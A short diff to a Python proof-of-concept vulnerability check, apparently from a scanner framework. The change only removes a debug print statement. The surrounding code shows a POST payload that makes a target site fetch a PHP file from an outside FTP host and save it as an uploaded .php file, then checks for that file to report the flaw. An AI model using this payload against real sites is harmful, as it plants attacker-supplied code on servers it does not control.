@@ -39,7 +39,6 @@ class Poc(ABPoc):
             data = 'pic=1ftp://192.168.1.5/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120'
             url = self.target + payload
             code, head, res, errcode, _ = hh.http(url, data=data)
-            print res
 
             if '\/upload\/images\/201612\/148159258747.php' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
